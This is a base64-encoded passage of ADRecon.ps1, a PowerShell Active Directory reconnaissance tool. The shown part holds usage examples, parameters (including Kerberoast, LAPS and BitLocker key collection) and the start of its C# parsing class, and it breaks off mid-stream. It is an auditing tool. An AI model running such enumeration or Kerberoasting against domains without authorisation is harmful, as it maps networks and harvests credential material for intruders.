dmVyc2lvbj4gYnkgUHJhc2hhbnQgTWFoYWphbiAoQHByYXNoYW50MzUzNSkgZnJvbSBTZW5zZSBvZiBTZWN1cml0eS4KICAgIFsqXSBSdW5uaW5nIG9uIFdPUktHUk9VUFw8aG9zdG5hbWU+IC0gU3RhbmRhbG9uZSBXb3Jrc3RhdGlvbgogICAgWypdIENvbW1lbmNpbmcgLSA8dGltZXN0YW1wPgogICAgWy1dIERvbWFpbiBDb250cm9sbGVycwogICAgWypdIFRvdGFsIEV4ZWN1dGlvbiBUaW1lIChtaW5zKTogPG1pbnV0ZXM+CiAgICBbKl0gR2VuZXJhdGluZyBBRFJlY29uLVJlcG9ydC54bHN4CiAgICBbK10gRXhjZWxzaGVldCBTYXZlZCB0bzogQzpcQURSZWNvbi1SZXBvcnQtPHRpbWVzdGFtcD5cPGRvbWFpbj4tQURSZWNvbi1SZXBvcnQueGxzeAogICAgWypdIENvbXBsZXRlZC4KICAgIFsqXSBPdXRwdXQgRGlyZWN0b3J5OiBDOlxBRFJlY29uLVJlcG9ydC08dGltZXN0YW1wPgoKICAgIEV4YW1wbGUgb3V0cHV0IGZyb20gZnJvbSBhIE5vbi1NZW1iZXIgdXNpbmcgUlNBVCB0byBvbmx5IGVudW1lcmF0ZSBEb21haW4gQ29udHJvbGxlcnMuCgouRVhBTVBMRQoKICAgIC5cQURSZWNvbi5wczEgLVByb3RvY29sIEFEV1MgLURvbWFpbkNvbnRyb2xsZXIgPElQIG9yIEZRRE4+IC1DcmVkZW50aWFsIDxkb21haW5cdXNlcm5hbWU+CiAgICBbKl0gQURSZWNvbiA8dmVyc2lvbj4gYnkgUHJhc2hhbnQgTWFoYWphbiAoQHByYXNoYW50MzUzNSkgZnJvbSBTZW5zZSBvZiBTZWN1cml0eS4KICAgIFsqXSBSdW5uaW5nIG9uIFdPUktHUk9VUFw8aG9zdG5hbWU+IC0gU3RhbmRhbG9uZSBXb3Jrc3RhdGlvbgogICAgWypdIENvbW1lbmNpbmcgLSA8dGltZXN0YW1wPgogICAgWy1dIERvbWFpbgogICAgWy1dIEZvcmVzdAogICAgWy1dIFRydXN0cwogICAgWy1dIFNpdGVzCiAgICBbLV0gU3VibmV0cwogICAgWy1dIERlZmF1bHQgUGFzc3dvcmQgUG9saWN5CiAgICBbLV0gRmluZSBHcmFpbmVkIFBhc3N3b3JkIFBvbGljeSAtIE1heSBuZWVkIGEgUHJpdmlsZWdlZCBBY2NvdW50CiAgICBbLV0gRG9tYWluIENvbnRyb2xsZXJzCiAgICBbLV0gVXNlcnMgLSBNYXkgdGFrZSBzb21lIHRpbWUKICAgIFstXSBVc2VyIFNQTnMKICAgIFstXSBQYXNzd29yZEF0dHJpYnV0ZXMgLSBFeHBlcmltZW50YWwKICAgIFstXSBHcm91cHMgLSBNYXkgdGFrZSBzb21lIHRpbWUKICAgIFstXSBHcm91cCBNZW1iZXJzaGlwcyAtIE1heSB0YWtlIHNvbWUgdGltZQogICAgWy1dIE9yZ2FuaXphdGlvbmFsVW5pdHMgKE9VcykKICAgIFstXSBHUE9zCiAgICBbLV0gZ1BMaW5rcyAtIFNjb3BlIG9mIE1hbmFnZW1lbnQgKFNPTSkKICAgIFstXSBETlMgWm9uZXMgYW5kIFJlY29yZHMKICAgIFstXSBQcmludGVycwogICAgWy1dIENvbXB1dGVycyAtIE1heSB0YWtlIHNvbWUgdGltZQogICAgWy1dIENvbXB1dGVyIFNQTnMKICAgIFstXSBMQVBTIC0gTmVlZHMgUHJpdmlsZWdlZCBBY2NvdW50CiAgICBXQVJOSU5HOiBbKl0gTEFQUyBpcyBub3QgaW1wbGVtZW50ZWQuCiAgICBbLV0gQml0TG9ja2VyIFJlY292ZXJ5IEtleXMgLSBOZWVkcyBQcml2aWxlZ2VkIEFjY291bnQKICAgIFstXSBBQ0xzIC0gTWF5IHRha2Ugc29tZSB0aW1lCiAgICBXQVJOSU5HOiBbKl0gU0FDTHMgLSBDdXJyZW50bHksIHRoZSBtb2R1bGUgaXMgb25seSBzdXBwb3J0ZWQgd2l0aCBMREFQLgogICAgWy1dIEdQT1JlcG9ydCAtIE1heSB0YWtlIHNvbWUgdGltZQogICAgV0FSTklORzogW0VYQ0VQVElPTl0gQ3VycmVudCBzZWN1cml0eSBjb250ZXh0IGlzIG5vdCBhc3NvY2lhdGVkIHdpdGggYW4gQWN0aXZlIERpcmVjdG9yeSBkb21haW4gb3IgZm9yZXN0LgogICAgV0FSTklORzogWypdIFJ1biB0aGUgdG9vbCB1c2luZyBSVU5BUy4KICAgIFdBUk5JTkc6IFsqXSBydW5hcyAvdXNlcjo8RG9tYWluIEZRRE4+XDxVc2VybmFtZT4gL25ldG9ubHkgcG93ZXJzaGVsbC5leGUKICAgIFsqXSBUb3RhbCBFeGVjdXRpb24gVGltZSAobWlucyk6IDxtaW51dGVzPgogICAgWypdIE91dHB1dCBEaXJlY3Rvcnk6IEM6XEFEUmVjb24tUmVwb3J0LTx0aW1lc3RhbXA+CiAgICBbKl0gR2VuZXJhdGluZyBBRFJlY29uLVJlcG9ydC54bHN4CiAgICBbK10gRXhjZWxzaGVldCBTYXZlZCB0bzogQzpcQURSZWNvbi1SZXBvcnQtPHRpbWVzdGFtcD5cPGRvbWFpbj4tQURSZWNvbi1SZXBvcnQueGxzeAoKICAgIEV4YW1wbGUgb3V0cHV0IGZyb20gYSBOb24tTWVtYmVyIHVzaW5nIFJTQVQuCgouRVhBTVBMRQoKICAgIC5cQURSZWNvbi5wczEgLVByb3RvY29sIExEQVAgLURvbWFpbkNvbnRyb2xsZXIgPElQIG9yIEZRRE4+IC1DcmVkZW50aWFsIDxkb21haW5cdXNlcm5hbWU+CiAgICBbKl0gQURSZWNvbiA8dmVyc2lvbj4gYnkgUHJhc2hhbnQgTWFoYWphbiAoQHByYXNoYW50MzUzNSkgZnJvbSBTZW5zZSBvZiBTZWN1cml0eS4KICAgIFsqXSBSdW5uaW5nIG9uIFdPUktHUk9VUFw8aG9zdG5hbWU+IC0gU3RhbmRhbG9uZSBXb3Jrc3RhdGlvbgogICAgWypdIExEQVAgYmluZCBTdWNjZXNzZnVsCiAgICBbKl0gQ29tbWVuY2luZyAtIDx0aW1lc3RhbXA+CiAgICBbLV0gRG9tYWluCiAgICBbLV0gRm9yZXN0CiAgICBbLV0gVHJ1c3RzCiAgICBbLV0gU2l0ZXMKICAgIFstXSBTdWJuZXRzCiAgICBbLV0gRGVmYXVsdCBQYXNzd29yZCBQb2xpY3kKICAgIFstXSBGaW5lIEdyYWluZWQgUGFzc3dvcmQgUG9saWN5IC0gTWF5IG5lZWQgYSBQcml2aWxlZ2VkIEFjY291bnQKICAgIFstXSBEb21haW4gQ29udHJvbGxlcnMKICAgIFstXSBVc2VycyAtIE1heSB0YWtlIHNvbWUgdGltZQogICAgWy1dIFVzZXIgU1BOcwogICAgWy1dIFBhc3N3b3JkQXR0cmlidXRlcyAtIEV4cGVyaW1lbnRhbAogICAgWy1dIEdyb3VwcyAtIE1heSB0YWtlIHNvbWUgdGltZQogICAgWy1dIEdyb3VwIE1lbWJlcnNoaXBzIC0gTWF5IHRha2Ugc29tZSB0aW1lCiAgICBbLV0gT3JnYW5pemF0aW9uYWxVbml0cyAoT1VzKQogICAgWy1dIEdQT3MKICAgIFstXSBnUExpbmtzIC0gU2NvcGUgb2YgTWFuYWdlbWVudCAoU09NKQogICAgWy1dIEROUyBab25lcyBhbmQgUmVjb3JkcwogICAgWy1dIFByaW50ZXJzCiAgICBbLV0gQ29tcHV0ZXJzIC0gTWF5IHRha2Ugc29tZSB0aW1lCiAgICBbLV0gQ29tcHV0ZXIgU1BOcwogICAgWy1dIExBUFMgLSBOZWVkcyBQcml2aWxlZ2VkIEFjY291bnQKICAgIFdBUk5JTkc6IFsqXSBMQVBTIGlzIG5vdCBpbXBsZW1lbnRlZC4KICAgIFstXSBCaXRMb2NrZXIgUmVjb3ZlcnkgS2V5cyAtIE5lZWRzIFByaXZpbGVnZWQgQWNjb3VudAogICAgWy1dIEFDTHMgLSBNYXkgdGFrZSBzb21lIHRpbWUKICAgIFstXSBHUE9SZXBvcnQgLSBNYXkgdGFrZSBzb21lIHRpbWUKICAgIFdBUk5JTkc6IFsqXSBDdXJyZW50bHksIHRoZSBtb2R1bGUgaXMgb25seSBzdXBwb3J0ZWQgd2l0aCBBRFdTLgogICAgWypdIFRvdGFsIEV4ZWN1dGlvbiBUaW1lIChtaW5zKTogPG1pbnV0ZXM+CiAgICBbKl0gT3V0cHV0IERpcmVjdG9yeTogQzpcQURSZWNvbi1SZXBvcnQtPHRpbWVzdGFtcD4KICAgIFsqXSBHZW5lcmF0aW5nIEFEUmVjb24tUmVwb3J0Lnhsc3gKICAgIFsrXSBFeGNlbHNoZWV0IFNhdmVkIHRvOiBDOlxBRFJlY29uLVJlcG9ydC08dGltZXN0YW1wPlw8ZG9tYWluPi1BRFJlY29uLVJlcG9ydC54bHN4CgogICAgRXhhbXBsZSBvdXRwdXQgZnJvbSBhIE5vbi1NZW1iZXIgdXNpbmcgTERBUC4KCi5MSU5LCgogICAgaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlLW9mLXNlY3VyaXR5L0FEUmVjb24KIz4KCltDbWRsZXRCaW5kaW5nKCldCnBhcmFtCigKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlLCBIZWxwTWVzc2FnZSA9ICJXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuIildCiAgICBbVmFsaWRhdGVTZXQoJ0FEV1MnLCAnTERBUCcpXQogICAgW3N0cmluZ10gJFByb3RvY29sID0gJ0FEV1MnLAoKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlLCBIZWxwTWVzc2FnZSA9ICJEb21haW4gQ29udHJvbGxlciBJUCBBZGRyZXNzIG9yIERvbWFpbiBGUUROLiIpXQogICAgW3N0cmluZ10gJERvbWFpbkNvbnRyb2xsZXIgPSAnJywKCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSwgSGVscE1lc3NhZ2UgPSAiRG9tYWluIENyZWRlbnRpYWxzLiIpXQogICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSwgSGVscE1lc3NhZ2UgPSAiUGF0aCBmb3IgQURSZWNvbiBvdXRwdXQgZm9sZGVyIGNvbnRhaW5pbmcgdGhlIENTViBmaWxlcyB0byBnZW5lcmF0ZSB0aGUgQURSZWNvbi1SZXBvcnQueGxzeC4gVXNlIGl0IHRvIGdlbmVyYXRlIHRoZSBBRFJlY29uLVJlcG9ydC54bHN4IHdoZW4gTWljcm9zb2Z0IEV4Y2VsIGlzIG5vdCBpbnN0YWxsZWQgb24gdGhlIGhvc3QgdXNlZCB0byBydW4gQURSZWNvbi4iKV0KICAgIFtzdHJpbmddICRHZW5FeGNlbCwKCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSwgSGVscE1lc3NhZ2UgPSAiUGF0aCBmb3IgQURSZWNvbiBvdXRwdXQgZm9sZGVyIHRvIHNhdmUgdGhlIENTVi9YTUwvSlNPTi9IVE1MIGZpbGVzIGFuZCB0aGUgQURSZWNvbi1SZXBvcnQueGxzeC4gKFRoZSBmb2xkZXIgc3BlY2lmaWVkIHdpbGwgYmUgY3JlYXRlZCBpZiBpdCBkb2Vzbid0IGV4aXN0KSIpXQogICAgW3N0cmluZ10gJE91dHB1dERpciwKCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSwgSGVscE1lc3NhZ2UgPSAiV2hpY2ggbW9kdWxlcyB0byBydW47IENvbW1hIHNlcGFyYXRlZDsgZS5nIEZvcmVzdCxEb21haW4gKERlZmF1bHQgYWxsIGV4Y2VwdCBLZXJiZXJvYXN0LCBEb21haW5BY2NvdW50c3VzZWRmb3JTZXJ2aWNlTG9nb24pIFZhbGlkIHZhbHVlcyBpbmNsdWRlOiBGb3Jlc3QsIERvbWFpbiwgVHJ1c3RzLCBTaXRlcywgU3VibmV0cywgUGFzc3dvcmRQb2xpY3ksIEZpbmVHcmFpbmVkUGFzc3dvcmRQb2xpY3ksIERvbWFpbkNvbnRyb2xsZXJzLCBVc2VycywgVXNlclNQTnMsIFBhc3N3b3JkQXR0cmlidXRlcywgR3JvdXBzLCBHcm91cE1lbWJlcnMsIE9VcywgR1BPcywgZ1BMaW5rcywgRE5TWm9uZXMsIFByaW50ZXJzLCBDb21wdXRlcnMsIENvbXB1dGVyU1BOcywgTEFQUywgQml0TG9ja2VyLCBBQ0xzLCBHUE9SZXBvcnQsIEtlcmJlcm9hc3QsIERvbWFpbkFjY291bnRzdXNlZGZvclNlcnZpY2VMb2dvbiIpXQogICAgW1ZhbGlkYXRlU2V0KCdGb3Jlc3QnLCAnRG9tYWluJywgJ1RydXN0cycsICdTaXRlcycsICdTdWJuZXRzJywgJ1Bhc3N3b3JkUG9saWN5JywgJ0ZpbmVHcmFpbmVkUGFzc3dvcmRQb2xpY3knLCAnRG9tYWluQ29udHJvbGxlcnMnLCAnVXNlcnMnLCAnVXNlclNQTnMnLCAnUGFzc3dvcmRBdHRyaWJ1dGVzJywgJ0dyb3VwcycsICdHcm91cE1lbWJlcnMnLCAnT1VzJywgJ0dQT3MnLCAnZ1BMaW5rcycsICdETlNab25lcycsICdQcmludGVycycsICdDb21wdXRlcnMnLCAnQ29tcHV0ZXJTUE5zJywgJ0xBUFMnLCAnQml0TG9ja2VyJywgJ0FDTHMnLCAnR1BPUmVwb3J0JywgJ0tlcmJlcm9hc3QnLCAnRG9tYWluQWNjb3VudHN1c2VkZm9yU2VydmljZUxvZ29uJywgJ0RlZmF1bHQnKV0KICAgIFthcnJheV0gJENvbGxlY3QgPSAnRGVmYXVsdCcsCgogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UsIEhlbHBNZXNzYWdlID0gIk91dHB1dCB0eXBlOyBDb21tYSBzZXBlcmF0ZWQ7IGUuZyBTVERPVVQsQ1NWLFhNTCxKU09OLEhUTUwsRXhjZWwgKERlZmF1bHQgU1RET1VUIHdpdGggLUNvbGxlY3QgcGFyYW1ldGVyLCBlbHNlIENTViBhbmQgRXhjZWwpIildCiAgICBbVmFsaWRhdGVTZXQoJ1NURE9VVCcsICdDU1YnLCAnWE1MJywgJ0pTT04nLCAnRVhDRUwnLCAnSFRNTCcsICdBbGwnLCAnRGVmYXVsdCcpXQogICAgW2FycmF5XSAkT3V0cHV0VHlwZSA9ICdEZWZhdWx0JywKCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSwgSGVscE1lc3NhZ2UgPSAiVGltZXNwYW4gZm9yIERvcm1hbnQgYWNjb3VudHMuIERlZmF1bHQgOTAgZGF5cyIpXQogICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwKV0KICAgIFtpbnRdICREb3JtYW50VGltZVNwYW4gPSA5MCwKCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSwgSGVscE1lc3NhZ2UgPSAiTWF4aW11bSBtYWNoaW5lIGFjY291bnQgcGFzc3dvcmQgYWdlLiBEZWZhdWx0IDMwIGRheXMiKV0KICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMCldCiAgICBbaW50XSAkUGFzc01heEFnZSA9IDMwLAoKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlLCBIZWxwTWVzc2FnZSA9ICJUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwIildCiAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0KICAgIFtpbnRdICRQYWdlU2l6ZSA9IDIwMCwKCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSwgSGVscE1lc3NhZ2UgPSAiVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwIildCiAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMCldCiAgICBbaW50XSAkVGhyZWFkcyA9IDEwLAoKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlLCBIZWxwTWVzc2FnZSA9ICJDcmVhdGUgQURSZWNvbiBMb2cgdXNpbmcgU3RhcnQtVHJhbnNjcmlwdCIpXQogICAgW3N3aXRjaF0gJExvZwopCgokQURXU1NvdXJjZSA9IEAiCi8vIFRoYW5rcyBEZW5uaXMgQWxidXF1ZXJxdWUgZm9yIHRoZSBDIyBtdWx0aXRocmVhZGluZyBjb2RlCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zOwp1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsKdXNpbmcgU3lzdGVtLkxpbnE7CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7CnVzaW5nIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2w7CnVzaW5nIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb247CgpuYW1lc3BhY2UgQURSZWNvbgp7CiAgICBwdWJsaWMgc3RhdGljIGNsYXNzIEFEV1NDbGFzcwogICAgewogICAgICAgIHByaXZhdGUgc3RhdGljIERhdGVUaW1lIERhdGUxOwogICAgICAgIHByaXZhdGUgc3RhdGljIGludCBQYXNzTWF4QWdlOwogICAgICAgIHByaXZhdGUgc3RhdGljIGludCBEb3JtYW50VGltZVNwYW47CiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4gQWRHcm91cERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4oKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgRG9tYWluU0lEOwogICAgICAgIHByaXZhdGUgc3RhdGljIERpY3Rpb25hcnk8U3RyaW5nLCBTdHJpbmc+IEFkR1BPRGljdGlvbmFyeSA9IG5ldyBEaWN0aW9uYXJ5PFN0cmluZywgU3RyaW5nPigpOwogICAgICAgIHByaXZhdGUgc3RhdGljIEhhc2h0YWJsZSBHVUlEcyA9IG5ldyBIYXNodGFibGUoKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyBEaWN0aW9uYXJ5PFN0cmluZywgU3RyaW5nPiBBZFNJRERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4oKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyByZWFkb25seSBIYXNoU2V0PHN0cmluZz4gR3JvdXBzID0gbmV3IEhhc2hTZXQ8c3RyaW5nPiAoIG5ldyBTdHJpbmdbXSB7IjI2ODQzNTQ1NiIsICIyNjg0MzU0NTciLCAiNTM2ODcwOTEyIiwgIjUzNjg3MDkxMyJ9ICk7CiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgcmVhZG9ubHkgSGFzaFNldDxzdHJpbmc+IFVzZXJzID0gbmV3IEhhc2hTZXQ8c3RyaW5nPiAoIG5ldyBTdHJpbmdbXSB7ICI4MDUzMDYzNjgiIH0gKTsKICAgICAgICBwcml2YXRlIHN0YXRpYyByZWFkb25seSBIYXNoU2V0PHN0cmluZz4gQ29tcHV0ZXJzID0gbmV3IEhhc2hTZXQ8c3RyaW5nPiAoIG5ldyBTdHJpbmdbXSB7ICI4MDUzMDYzNjkiIH0pIDsKICAgICAgICBwcml2YXRlIHN0YXRpYyByZWFkb25seSBIYXNoU2V0PHN0cmluZz4gVHJ1c3RBY2NvdW50cyA9IG5ldyBIYXNoU2V0PHN0cmluZz4gKCBuZXcgU3RyaW5nW10geyAiODA1MzA2MzcwIiB9ICk7CgogICAgICAgIFtGbGFnc10KICAgICAgICAvL1ZhbHVlcyB0YWtlbiBmcm9tIGh0dHBzOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2VuLWF1L2tiLzMwNTE0NAogICAgICAgIHB1YmxpYyBlbnVtIFVBQ0ZsYWdzCiAgICAgICAgewogICAgICAgICAgICBTQ1JJUFQgPSAxLCAgICAgICAgLy8gMHgxCiAgICAgICAgICAgIEFDQ09VTlRESVNBQkxFID0gMiwgICAgICAgIC8vIDB4MgogICAgICAgICAgICBIT01FRElSX1JFUVVJUkVEID0gOCwgICAgICAgIC8vIDB4OAogICAgICAgICAgICBMT0NLT1VUID0gMTYsICAgICAgIC8vIDB4MTAKICAgICAgICAgICAgUEFTU1dEX05PVFJFUUQgPSAzMiwgICAgICAgLy8gMHgyMAogICAgICAgICAgICBQQVNTV0RfQ0FOVF9DSEFOR0UgPSA2NCwgICAgICAgLy8gMHg0MAogICAgICAgICAgICBFTkNSWVBURURfVEVYVF9QQVNTV09SRF9BTExPV0VEID0gMTI4LCAgICAgIC8vIDB4ODAKICAgICAgICAgICAgVEVNUF9EVVBMSUNBVEVfQUNDT1VOVCA9IDI1NiwgICAgICAvLyAweDEwMAogICAgICAgICAgICBOT1JNQUxfQUNDT1VOVCA9IDUxMiwgICAgICAvLyAweDIwMAogICAgICAgICAgICBJTlRFUkRPTUFJTl9UUlVTVF9BQ0NPVU5UID0gMjA0OCwgICAgIC8vIDB4ODAwCiAgICAgICAgICAgIFdPUktTVEFUSU9OX1RSVVNUX0FDQ09VTlQgPSA0MDk2LCAgICAgLy8gMHgxMDAwCiAgICAgICAgICAgIFNFUlZFUl9UUlVTVF9BQ0NPVU5UID0gODE5MiwgICAgIC8vIDB4MjAwMAogICAgICAgICAgICBET05UX0VYUElSRV9QQVNTV0QgPSA2NTUzNiwgICAgLy8gMHgxMDAwMAogICAgICAgICAgICBNTlNfTE9HT05fQUNDT1VOVCA9IDEzMTA3MiwgICAvLyAweDIwMDAwCiAgICAgICAgICAgIFNNQVJUQ0FSRF9SRVFVSVJFRCA9IDI2MjE0NCwgICAvLyAweDQwMDAwCiAgICAgICAgICAgIFRSVVNURURfRk9SX0RFTEVHQVRJT04gPSA1MjQyODgsICAgLy8gMHg4MDAwMAogICAgICAgICAgICBOT1RfREVMRUdBVEVEID0gMTA0ODU3NiwgIC8vIDB4MTAwMDAwCiAgICAgICAgICAgIFVTRV9ERVNfS0VZX09OTFkgPSAyMDk3MTUyLCAgLy8gMHgyMDAwMDAKICAgICAgICAgICAgRE9OVF9SRVFVSVJFX1BSRUFVVEggPSA0MTk0MzA0LCAgLy8gMHg0MDAwMDAKICAgICAgICAgICAgUEFTU1dPUkRfRVhQSVJFRCA9IDgzODg2MDgsICAvLyAweDgwMDAwMAogICAgICAgICAgICBUUlVTVEVEX1RPX0FVVEhFTlRJQ0FURV9GT1JfREVMRUdBVElPTiA9IDE2Nzc3MjE2LCAvLyAweDEwMDAwMDAKICAgICAgICAgICAgUEFSVElBTF9TRUNSRVRTX0FDQ09VTlQgPSA2NzEwODg2NCAvLyAweDA0MDAwMDAwCiAgICAgICAgfQoKICAgICAgICBbRmxhZ3NdCiAgICAgICAgLy9WYWx1ZXMgdGFrZW4gZnJvbSBodHRwczovL2Jsb2dzLm1zZG4ubWljcm9zb2Z0LmNvbS9vcGVuc3BlY2lmaWNhdGlvbi8yMDExLzA1LzMwL3dpbmRvd3MtY29uZmlndXJhdGlvbnMtZm9yLWtlcmJlcm9zLXN1cHBvcnRlZC1lbmNyeXB0aW9uLXR5cGUvCiAgICAgICAgcHVibGljIGVudW0gS2VyYkVuY0ZsYWdzCiAgICAgICAgewogICAgICAgICAgICBaRVJPID0gMCwKICAgICAgICAgICAgREVTX0NCQ19DUkMgPSAxLCAgICAgICAgLy8gMHgxCiAgICAgICAgICAgIERFU19DQkNfTUQ1ID0gMiwgICAgICAgIC8vIDB4MgogICAgICAgICAgICBSQzRfSE1BQyA9IDQsICAgICAgICAvLyAweDQKICAgICAgICAgICAgQUVTMTI4X0NUU19ITUFDX1NIQTFfOTYgPSA4LCAgICAgICAvLyAweDE4CiAgICAgICAgICAgIEFFUzI1Nl9DVFNfSE1BQ19TSEExXzk2ID0gMTYgICAgICAgLy8gMHgxMAogICAgICAgIH0KCgkJcHJpdmF0ZSBzdGF0aWMgcmVhZG9ubHkgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4gUmVwbGFjZW1lbnRzID0gbmV3IERpY3Rpb25hcnk8U3RyaW5nLCBTdHJpbmc+KCkKICAgICAgICB7CiAgICAgICAgICAgIC8ve1N5c3RlbS5FbnZpcm9ubWVudC5OZXdMaW5lLCAiIn0sCiAgICAgICAgICAgIC8veyIsIiwgIjsifSwKICAgICAgICAgICAgeyJcIiIsICInIn0KICAgICAgICB9OwoKICAgICAgICBwdWJsaWMgc3RhdGljIFN0cmluZyBDbGVhblN0cmluZyhPYmplY3QgU3RyaW5ndG9DbGVhbikKICAgICAgICB7CiAgICAgICAgICAgIC8vIFJlbW92ZSBleHRyYSBzcGFjZXMgYW5kIG5ldyBsaW5lcwogICAgICAgICAgICBTdHJpbmcgQ2xlYW5lZFN0cmluZyA9IFN0cmluZy5Kb2luKCIgIiwgKChDb252ZXJ0LlRvU3RyaW5nKFN0cmluZ3RvQ2xlYW4pKS5TcGxpdCgoc3RyaW5nW10pIG51bGwsIFN0cmluZ1NwbGl0T3B0aW9ucy5SZW1vdmVFbXB0eUVudHJpZXMpKSk7CiAgICAgICAgICAgIGZvcmVhY2ggKFN0cmluZyBSZXBsYWNlbWVudCBpbiBSZXBsYWNlbWVudHMuS2V5cykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ2xlYW5lZFN0cmluZyA9IENsZWFuZWRTdHJpbmcuUmVwbGFjZShSZXBsYWNlbWVudCwgUmVwbGFjZW1lbnRzW1JlcGxhY2VtZW50XSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIENsZWFuZWRTdHJpbmc7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIGludCBPYmplY3RDb3VudChPYmplY3RbXSBBRFJPYmplY3QpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gQURST2JqZWN0Lkxlbmd0aDsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBzdGF0aWMgT2JqZWN0W10gVXNlclBhcnNlcihPYmplY3RbXSBBZFVzZXJzLCBEYXRlVGltZSBEYXRlMSwgaW50IERvcm1hbnRUaW1lU3BhbiwgaW50IFBhc3NNYXhBZ2UsIGludCBudW1PZlRocmVhZHMpCiAgICAgICAgewogICAgICAgICAgICBBRFdTQ2xhc3MuRGF0ZTEgPSBEYXRlMTsKICAgICAgICAgICAgQURXU0NsYXNzLkRvcm1hbnRUaW1lU3BhbiA9IERvcm1hbnRUaW1lU3BhbjsKICAgICAgICAgICAgQURXU0NsYXNzLlBhc3NNYXhBZ2UgPSBQYXNzTWF4QWdlOwoKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkVXNlcnMsIG51bU9mVGhyZWFkcywgIlVzZXJzIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIFVzZXJTUE5QYXJzZXIoT2JqZWN0W10gQWRVc2VycywgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIE9iamVjdFtdIEFEUk9iaiA9IHJ1blByb2Nlc3NvcihBZFVzZXJzLCBudW1PZlRocmVhZHMsICJVc2VyU1BOcyIpOwogICAgICAgICAgICByZXR1cm4gQURST2JqOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyBPYmplY3RbXSBHcm91cFBhcnNlcihPYmplY3RbXSBBZEdyb3VwcywgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIE9iamVjdFtdIEFEUk9iaiA9IHJ1blByb2Nlc3NvcihBZEdyb3VwcywgbnVtT2ZUaHJlYWRzLCAiR3JvdXBzIik7CiAgICAgICAgICAgIHJldHVybiBBRFJPYmo7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIE9iamVjdFtdIEdyb3VwTWVtYmVyUGFyc2VyKE9iamVjdFtdIEFkR3JvdXBzLCBPYmplY3RbXSBBZEdyb3VwTWVtYmVycywgU3RyaW5nIERvbWFpblNJRCwgaW50IG51bU9mVGhyZWFkcykKICAgICAgICB7CiAgICAgICAgICAgIEFEV1NDbGFzcy5BZEdyb3VwRGljdGlvbmFyeSA9IG5ldyBEaWN0aW9uYXJ5PFN0cmluZywgU3RyaW5nPigpOwogICAgICAgICAgICBydW5Qcm9jZXNzb3IoQWRHcm91cHMsIG51bU9mVGhyZWFkcywgIkdyb3Vwc0RpY3Rpb25hcnkiKTsKICAgICAgICAgICAgQURXU0NsYXNzLkRvbWFpblNJRCA9IERvbWFpblNJRDsKICAgICAgICAgICAgT2JqZWN0W10gQURST2JqID0gcnVuUHJvY2Vzc29yKEFkR3JvdXBNZW1iZXJzLCBudW1PZlRocmVhZHMsICJHcm91cE1lbWJlcnMiKTsKICAgICAgICAgICAgcmV0dXJuIEFEU